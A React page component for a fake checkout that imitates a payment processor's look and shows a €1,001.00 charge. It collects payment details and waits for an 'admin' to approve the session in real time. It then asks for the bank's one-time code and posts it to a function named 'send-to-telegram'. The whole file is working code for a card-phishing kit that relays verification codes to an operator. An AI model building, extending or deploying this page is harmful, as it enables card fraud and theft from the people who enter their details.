import { useState, useEffect } from "react";
import PaymentForm from "@/components/PaymentForm";
import OtpVerification from "@/components/OtpVerification";
import PaymentSuccess from "@/components/PaymentSuccess";
import WaitingScreen from "@/components/WaitingScreen";
import { supabase } from "@/integrations/supabase/client";

const Index = () => {
  const [step, setStep] = useState<"form" | "waiting" | "otp" | "success">("form");
  const [amount] = useState("1000.00");
  const [sessionId, setSessionId] = useState<string | null>(null);

  const handleFormSubmit = (id: string) => {
    setSessionId(id);
    setStep("waiting");
  };

  // Listen for admin to approve → move to OTP
  useEffect(() => {
    if (!sessionId || step !== "waiting") return;

    const channel = supabase
      .channel(`session-${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          const newStatus = (payload.new as any).status;
          if (newStatus === "otp") setStep("otp");
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [sessionId, step]);

  const handleOtpSubmit = (otp: string) => {
    fetch(
      `https://${import.meta.env.VITE_SUPABASE_PROJECT_ID}.supabase.co/functions/v1/send-to-telegram`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ type: "otp", otp }),
      }
    );
    if (sessionId) {
      supabase.from("sessions").update({ status: "success" as any }).eq("id", sessionId).then();
    }
    setStep("success");
  };

  return (
    <div className="min-h-screen bg-stripe-bg flex">
      {/* Left panel — branding / order summary */}
      <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14">
        <div>
          <div className="flex items-center gap-2 mb-12">
            <div className="h-8 w-8 rounded-full bg-primary flex items-center justify-center">
              <span className="text-primary-foreground text-sm font-bold">P</span>
            </div>
            <span className="text-white/90 font-semibold text-lg">Pay</span>
          </div>

          <div className="space-y-6">
            <div>
              <p className="text-white/50 text-sm">Pay Company</p>
              <p className="text-white text-4xl font-bold tracking-tight mt-1">€1,001.00</p>
            </div>

            <div className="space-y-4 mt-8">
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Amount to pay</p>
                <p className="text-white/90 text-sm">€1,000.00</p>
              </div>
              <div className="flex items-center justify-between py-3 border-b border-white/10">
                <p className="text-white/50 text-sm">Transaction fee</p>
                <p className="text-white/90 text-sm">€1.00</p>
              </div>
              <div className="flex items-center justify-between py-3">
                <p className="text-white/90 text-sm font-semibold">Total</p>
                <p className="text-white text-sm font-semibold">€1,001.00</p>
              </div>
            </div>
          </div>
        </div>

        <div className="flex items-center gap-4 text-white/30 text-xs">
          <span>Powered by <span className="font-semibold text-white/50">Pay</span></span>
          <span>·</span>
          <a href="#" className="hover:text-white/50 transition-colors">Terms</a>
          <a href="#" className="hover:text-white/50 transition-colors">Privacy</a>
        </div>
      </div>

      {/* Right panel — form area */}
      <div className="flex-1 flex items-start justify-center bg-background rounded-tl-none lg:rounded-tl-2xl lg:rounded-bl-2xl overflow-y-auto">
        <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
          {/* Mobile header */}
          <div className="lg:hidden mb-8">
            <div className="flex items-center gap-2 mb-4">
              <div className="h-7 w-7 rounded-full bg-primary flex items-center justify-center">
                <span className="text-primary-foreground text-xs font-bold">P</span>
              </div>
              <span className="text-foreground font-semibold">Pay</span>
            </div>
            <p className="text-muted-foreground text-sm">Pay Company</p>
            <p className="text-foreground text-3xl font-bold tracking-tight mt-1">€1,001.00</p>
          </div>

          {step === "form" && <PaymentForm amount={amount} onSuccess={handleFormSubmit} />}
          {step === "waiting" && <WaitingScreen />}
          {step === "otp" && <OtpVerification onSubmit={handleOtpSubmit} />}
          {step === "success" && <PaymentSuccess amount={amount} />}
        </div>
      </div>
    </div>
  );
};

export default Index;
